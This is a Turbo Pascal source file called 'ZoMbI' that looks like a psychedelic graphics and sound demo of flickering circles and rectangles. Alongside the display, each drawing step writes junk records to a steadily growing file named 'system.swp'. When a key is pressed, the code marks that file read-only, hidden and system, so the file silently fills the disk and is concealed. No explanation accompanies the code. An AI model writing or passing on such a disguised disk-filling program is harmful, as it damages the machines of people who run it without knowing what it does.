Program ZoMbI;
{$N+}
uses graph,crt,dos;
var
d, e, r,x1,x2,y1,y2,col,col1,p1,p2,p3,rad,ff,nn :integer;
palette :palettetype;
file1 :file of comp;
a :integer;
data :comp;


Procedure krug(x1, y1, x2, y2 :integer);
begin
for ff := 0 to nn do
begin;
if rad < 319 then rad := rad + 1 else rad := 0;
p1 := p1 + random(2);
p2 := p2 + random(2);
p3 := p3 + random(2);
setrgbpalette(col,p1,p2,p3);
circle(x1,y1,rad);
setcolor(random(15));

if rad < 319 then rad := rad + 1 else rad := 0;
circle(x2,y2,rad);
setcolor(col);
data:=data+1;
for a:=1 to random(100) do
WRITE(FILE1,data);
sound(random(random(random(random(65535)))));
if keypressed = true then
begin
nosound;
restorecrtmode;
setfattr(file1,$02);
setfattr(file1,$01);
setfattr(file1,$04);
exit;
end;
end;
end;

Procedure kvadr(x1,y1,x2,y2 :integer);
begin
for ff := 0 to nn do
begin
if x1 <= 639 then x1 := x1 + 1 else x1 := 0;
if x2 >= 0 then x2 := x2 - 1 else x2 := 639;
if y1 <= 470 then y1 := y1 + 1 else y1 := 0;
if y2 >= 0 then y2 := y2 - 1 else y2 := 479;
p1 := p1 + random(2);
p2 := p2 + random(2);
p3 := p3 + random(2);
setrgbpalette(col,p1,p2,p3);

rectangle(x1,y1,x2,y2);
setcolor(random(15));

if x1 <= 639 then x1 := x1 + 1 else x1 := 0;
if x2 >= 0 then x2 := x2 - 1 else x2 := 639;
if y1 <= 470 then y1 := y1 + 1 else y1 := 0;
if y2 >= 0 then y2 := y2 - 1 else y2 := 479;

rectangle(x1,y1,x2,y2);
setcolor(col);
data:=data+1;
for a:=1 to random(100) do
WRITE(FILE1,data);
sound(random(random(random(random(65535)))));
if keypressed = true then
begin
nosound;
restorecrtmode;
setfattr(file1,$02);
setfattr(file1,$01);
setfattr(file1,$04);
exit;
end;
end;
end;

begin
d := detect;
initgraph(d, r, '');
e := graphresult;
if e <> grOK then
writeln(grapherrormsg(e))
else begin
cleardevice;
end;
randomize;
Assign(FILE1,'system.swp');
REWRITE(FILE1);


repeat
sound(random(random(random(random(65535)))));
nn := random(200);
kvadr(0,0,639,479);
krug(320,240,320,240);
kvadr(random(640),random(480),639,479);
krug(random(640),random(480),320,240);
kvadr(0,0,random(640),random(480));
krug(320,240,random(640),random(480));
kvadr(random(640),random(480),random(640),random(480));
krug(random(640),random(480),random(640),random(480));

until keypressed;
nosound;
end.